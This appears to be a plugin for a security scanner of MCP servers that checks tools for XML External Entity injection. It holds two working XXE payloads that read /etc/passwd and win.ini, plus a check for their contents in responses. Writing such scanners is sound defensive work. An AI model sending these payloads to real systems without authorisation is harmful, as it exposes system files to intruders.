from mcp_sec.core.models import PluginResult, Severity
from mcp_sec.core.utils import run_payload_scan

def info():
    return {
        "name": "xxe_injection",
        "title": "XML External Entity (XXE) Injection",
        "description": "Tests if tools process XML input unsafely, allowing external entity resolution.",
        "severity": Severity.HIGH,
        "author": "Marc Stöcker",
        "contact": "v3rm1ll1on@proton.me",
        "version": "1.0.0",
        "groups": ["owasp", "xxe"],
        "cwe": "CWE-611",
        "owasp": "A05:2021-Security Misconfiguration"
    }

async def run_test(mcp_client, server_tools) -> PluginResult:
    payloads = [
        """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>""",
        """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]><foo>&xxe;</foo>"""
    ]

    def check_vuln(res_text, exc, is_error=False):
        return bool(res_text and ("root:x:0:0:" in res_text or "[extensions]" in res_text))

    return await run_payload_scan(
        mcp_client, server_tools, info(),
        payloads=payloads,
        check_vuln=check_vuln,
        vuln_title="XXE Vulnerability",
        vuln_description=lambda t, p, pl: f"Tool '{t.name}' resolved an external entity (XXE) via XML payload.",
        vuln_severity=Severity.HIGH,
        success_message="No XXE vulnerabilities found."
    )
